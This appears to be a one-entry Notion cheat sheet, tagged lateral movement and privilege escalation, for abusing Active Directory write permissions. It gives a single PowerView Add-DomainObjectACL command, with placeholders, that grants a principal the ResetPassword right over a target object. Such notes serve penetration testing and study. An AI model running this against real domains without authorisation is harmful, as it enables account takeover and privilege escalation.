# PowerView: Write ACL

OS: Active_Directory, Windows
Description: PowerView WriteACL
Security Domains: Lateral Movement (https://www.notion.so/Lateral-Movement-1444c8e5237680dea1fed00199ad754d?pvs=21), Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21), PowerView (https://www.notion.so/PowerView-1454c8e523768011a934c27c986b7ef4?pvs=21)

```jsx
Add-DomainObjectACL -TargetIdentity <who_we_have_rights_on> -PrincipalIdentity <who_we_are_now> -Rights ResetPassword -Verbose
```